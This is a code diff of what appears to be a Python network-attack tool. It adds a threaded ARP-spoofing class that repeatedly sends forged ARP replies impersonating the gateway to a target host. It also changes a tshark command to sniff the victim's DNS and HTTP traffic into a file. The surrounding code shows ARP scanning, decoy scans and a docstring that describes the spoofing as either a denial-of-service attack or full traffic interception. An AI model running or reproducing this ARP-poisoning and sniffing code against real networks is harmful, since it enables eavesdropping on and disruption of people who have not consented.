@@ -8,7 +8,8 @@ import sys
 from tools import *
 import fcntl, socket, struct
 import random
-from threading import Thread #Use thread for decoy scan
+from threading import * #Use thread for decoy scan
+
 
 class Decoy(Thread):
     def __init__(self, fakeIp, targetList, interface):
@@ -29,7 +30,24 @@ class Sniffer(Thread):
 
     def run(self):
         if self.type == "dns":
-            os.system("sudo tshark -i wlan0 -f 'dst port 53' -n -T fields -e dns.qry.name > voila; cat voila | grep 'GET\|DNS' | cut -f 3,5,7 | awk 'length($0)<100 {print}' | sed 's/Standard query/ /g' | cut -d ' ' -f 1,2,3,6 | sed 's/\t/ /g'| sort | uniq -c > final" )
+            os.system("sudo tshark -i wlan0 -f 'dst port 53 or port 80' -Y 'eth.src!=84:ef:18:7b:34:14' -T tabs > dns_http_sniffed.txt" ) #-Y 'eth.src!=84:ef:18:7b:34:14'
+
+class Spoofer(Thread):
+    def __init__(self, gateway_ip, target_ip, my_mac, interface):
+        Thread.__init__(self)
+        self.gateway_ip = gateway_ip
+        self.target_ip = target_ip
+        self.my_mac = my_mac
+        self.interface = interface
+        self.running = True
+
+    def run(self):
+        packet = Ether()/ARP(op="who-has",hwsrc=self.my_mac,psrc=self.gateway_ip,pdst=self.target_ip)
+        while self.running:
+            sendp(packet, verbose=0, iface=self.interface)
+
+    def stop(self):
+        self.running = False
 
 def select_interface():
     all_interfaces = netifaces.interfaces()
@@ -122,7 +140,8 @@ def arp_scan(my_interface, decoy=False, verbosity=0):
     return ip_list
 
 def preset_arp_spoofing(ip_forward=True):
-    """return the gateway in result[0], the target in result[1] and the mac address in result[2]
+    """return the gateway in result[0], the target in result[1], the mac address in result[2]
+    and the interface in result[3]
 
     -if ip_forward is false you make an dos attack
     -else you able to see all packets send by the target
@@ -162,6 +181,7 @@ def preset_arp_spoofing(ip_forward=True):
         print(colors.FAIL+"Cant get local mac address, quitting"+colors.ENDC)
         sys.exit(1)
     result.append(my_mac)
+    result.append(my_interface)
     return result
 
 def arpSpoofing(gateway_ip, target_ip, my_mac):
@@ -169,6 +189,7 @@ def arpSpoofing(gateway_ip, target_ip, my_mac):
     packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=gateway_ip,pdst=target_ip)
     while 1:
         sendp(packet, verbose=0)
+
 
 
 #dns request
